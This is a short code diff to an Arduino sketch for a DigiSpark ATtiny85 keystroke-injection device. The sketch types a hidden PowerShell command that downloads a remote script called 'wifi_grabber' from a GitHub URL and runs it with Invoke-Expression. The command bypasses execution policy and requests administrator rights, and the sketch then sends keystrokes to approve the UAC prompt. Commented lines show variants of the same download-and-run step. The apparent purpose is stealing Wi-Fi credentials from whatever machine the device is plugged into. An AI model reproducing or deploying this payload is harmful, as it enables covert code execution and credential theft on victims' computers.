@@ -14,7 +14,7 @@ void loop() {
 //  DigiKeyboard.println("powershell -w h -c \"iwr https://raw.githubusercontent.com/mikcamz/attiny85_curl/main/wifi_grabber|iex\""); //ultrashortcommand
 //  DigiKeyboard.println("powershell -windowstyle hidden -Command "& {Invoke-WebRequest -Uri https://raw.githubusercontent.com/mikcamz/attiny85_curl/main/wifi_grabber -UseBasicParsing | Invoke-Expression}""); //full command
 //  DigiKeyboard.println("powershell -command "& {Start-Process powershell -ArgumentList '-NoProfile -ExecutionPolicy Bypass -Command \"Invoke-WebRequest -Uri https://raw.githubusercontent.com/mikcamz/attiny85_curl/main/wifi_grabber -UseBasicParsing | Invoke-Expression\"'}""); //for debugging
-  DigiKeyboard.println("powershell -c \"Start-Process powershell -ArgumentList '-NoP -Exec Bypass -w h -c \"iwr https://raw.githubusercontent.com/mikcamz/attiny85_curl/main/wifi_grabber|iex\"' -Verb RunAs\""); //shortened and PRIV
+  DigiKeyboard.println("powershell -c \"Start-Process powershell -ArgumentList '-NoP -Exec Bypass -w h -c \"iwr -UseBasicParsing https://raw.githubusercontent.com/mikcamz/attiny85_curl/main/wifi_grabber|iex\"' -Verb RunAs\""); //shortened and PRIV
   DigiKeyboard.sendKeyStroke(0, MOD_CONTROL_LEFT | MOD_SHIFT_LEFT | MOD_ALT_LEFT);  // Ctrl + Shift + Enter
   delay(2000);  // Wait for UAC to appear
 
